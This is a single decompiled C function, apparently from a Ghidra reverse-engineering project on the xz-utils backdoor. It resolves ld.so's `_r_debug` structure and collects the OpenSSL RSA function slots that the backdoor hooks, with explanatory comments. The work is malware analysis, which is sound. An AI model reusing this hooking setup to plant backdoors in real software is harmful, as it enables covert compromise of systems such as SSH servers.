// /home/kali/xzre-ghidra/xzregh/104A40_process_shared_libraries.c
// Function: process_shared_libraries @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Resolves `_r_debug` out of ld.so, verifies `r_state > 0`, and then feeds a stack-resident copy of `backdoor_shared_libraries_data_t` into `process_shared_libraries_map`. On success the filled-in handles, PLT slots, and libc import table are copied back to the caller so later stages never have to touch `_r_debug` again.
 */

#include "xzre_types.h"

BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)

{
  BOOL success;
  Elf64_Sym *r_debug_symbol;
  uchar *r_debug_addr;
  backdoor_shared_libraries_data_t tmp_state;
  Elf64_Sym *r_debug_sym;
  uchar *debug_block;
  void *orig_RSA_public_decrypt_slot;
  void *orig_EVP_PKEY_set1_RSA_slot;
  void *orig_RSA_get0_key_slot;
  backdoor_hooks_data_t **orig_hooks_data_slot;
  libc_imports_t *orig_libc_imports;
  
  // AutoDoc: Use the versioned `_r_debug` export so we never read the wrong struct layout.
  r_debug_symbol = elf_symbol_get(data->elf_handles->ldso,STR_r_debug,STR_GLIBC_2_2_5);
  success = FALSE;
  if (r_debug_symbol != (Elf64_Sym *)0x0) {
    debug_block = (uchar *)data->elf_handles;
    // AutoDoc: Turn the symbol value into a runtime pointer before inspecting `r_state`/`r_map`.
    r_debug_addr = ((elf_handles_t *)debug_block)->ldso->elfbase->e_ident + r_debug_symbol->st_value;
    success = FALSE;
    // AutoDoc: `r_state > 0` proves the dynamic linker finished initialising the list.
    if (0 < *(int *)r_debug_addr) {
      r_debug_sym = (Elf64_Sym *)data->shared_maps;
      orig_RSA_public_decrypt_slot = data->rsa_public_decrypt_slot;
      orig_EVP_PKEY_set1_RSA_slot = data->evp_set1_rsa_slot;
      orig_RSA_get0_key_slot = data->rsa_get0_key_slot;
      orig_hooks_data_slot = data->hooks_data_slot;
      orig_libc_imports = data->libc_imports;
      // AutoDoc: Work on a stack scratch copy so the caller’s struct only updates when the scan succeeds.
      success = process_shared_libraries_map
                        (*(link_map **)(r_debug_addr + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
                        );
      success = (BOOL)(success != FALSE);
    }
  }
  return success;
}

